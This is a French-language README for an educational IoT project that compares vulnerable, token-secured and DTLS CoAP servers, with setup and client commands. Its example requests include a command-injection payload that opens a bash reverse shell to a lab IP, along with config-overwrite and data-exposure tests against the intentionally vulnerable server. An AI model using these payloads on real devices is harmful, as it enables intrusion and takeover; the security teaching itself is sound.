# Serveurs CoAP pour l'IoT - Exemples de Sécurité

Ce projet contient trois implémentations de serveurs CoAP (Constrained Application Protocol) pour l'Internet des Objets (IoT), chacune avec différents niveaux de sécurité. Ces implémentations sont destinées à des fins éducatives pour comprendre les vulnérabilités courantes et les bonnes pratiques de sécurité dans les applications IoT.

## Aperçu des serveurs

1. **Serveur vulnérable** (`vulnerable_coap_server.py`) : 
   - Version avec de nombreuses vulnérabilités
   - Ne pas utiliser en production !
   - Utile pour démontrer les risques de sécurité

2. **Serveur sécurisé** (`secure_coap_server.py`) :
   - Version avec authentification par jetons
   - Validation des entrées
   - Gestion sécurisée des configurations sensibles

3. **Serveur DTLS** (`dtls_coap_server.py`) :
Nous ne sommes pas parvenus à le faire fonctionner, mais il est inclus pour référence.
   - Tentative d'ajout du chiffrement DTLS (Datagram TLS)
   - Utilise des clés pré-partagées pour l'authentification
   - Combine chiffrement des communications avec certaines des vulnérabilités du premier serveur

## Prérequis

- Python 3.13 (version avec laquelle le code a été testé)
- Bibliothèque aiocoap
- Bibliothèque tinydtls pour la version DTLS

Installation des dépendances :
```bash
pip install aiocoap
```

## Utilisation

### Démarrage des serveurs

Choisissez un des serveurs selon vos besoins :

```bash
# Serveur vulnérable (port 5683)
python vulnerable_coap_server.py

# Serveur sécurisé avec authentification (port 5683)
python secure_coap_server.py

# Serveur avec chiffrement DTLS (ports 5683 et 5684)
python dtls_coap_server.py
```

### Accès aux ressources

Les trois serveurs exposent des ressources similaires :

- `/sensors/temperature` - Données de température
- `/sensors/sound` - Données sonores
- `/sensors/presence` - Données de présence
- `/sensors` - Toutes les données des capteurs
- `/config` - Configuration du serveur

Le serveur sécurisé ajoute :
- `/auth` - Authentification et génération de jetons
- `/status` - État du serveur

### Exemples d'utilisation

#### Avec un client CoAP comme `coap-client` :

Pour le client, nous avons utilisé la librairie libcoap.

```bash
# Installation de libcoap (si nécessaire)
git clone https://github.com/obgm/libcoap
cd libcoap
sudo apt install libtool
./autogen.sh
sudo apt install doxygen
sudo apt install asciidoc
./configure --disable-dtls # Pour la version avec le serveur vulnérable
# ou
./configure --enable-dtls # Pour la version DTLS
sudo make
sudo make install
sudo make all
```

Requêtes de test client vers serveur avec `coap-client` depuis le répertoire `libcoap/examples` :

```bash
# Requête GET sur le serveur non sécurisé
./coap-client -m get "coap://192.168.2.76:5683/sensors/presence"

# Requête PUT sur le serveur vulnérable
./coap-client -m put -e '{"value": 9999, "unit": "Test", "device_id": "temp1"}' coap://192.168.2.76:5683/sensors/temperature

# Requête POST sur le serveur vulnérable avec injection de commande
./coap-client -m post -e "bash -c 'bash -i >& /dev/tcp/192.168.2.26/444
4 0>81'" coap://192.168.2.76:5683/sensors/temperature

# Authentification sur le serveur sécurisé
./coap-client -m post -t json -e '{"username": "admin", "password": "ad
min_password"}' coap://192.168.2.76:5683/auth

# Requête avec token d'authentification
./coap-client -m get coap://192.168.2.76:5683/sensors/temperature?token
=votre_token_ici"
```

## Comparaison des fonctionnalités de sécurité

| Fonctionnalité | Serveur vulnérable | Serveur sécurisé | Serveur DTLS |
|----------------|--------------------|--------------------|--------------|
| Authentification | ❌ | ✅ (Tokens) | ✅ (DTLS PSK) |
| Chiffrement | ❌ | ❌ | ✅ |
| Validation des entrées | ❌ | ✅ | ❌ |
| Protection contre injection | ❌ | ✅ | ❌ |
| Gestion sécurisée des configs | ❌ | ✅ | ❌ |

## Vulnérabilités à tester (serveur vulnérable)

1. **Injection de commandes** : 
   ```
   coap-client -m post -e 'ls -la' coap://localhost:5683/sensors/temperature
   ```

2. **Exposition de données sensibles** :
   ```
   coap-client -m get coap://localhost:5683/config
   ```

3. **Modification non autorisée de configuration** :
   ```
   coap-client -m put -e '{"admin_password":"hacked"}' coap://localhost:5683/config
   ```

## Avertissement

Ce code est fourni uniquement à des fins éducatives et de recherche. Ne déployez pas les versions vulnérables sur des réseaux de production.
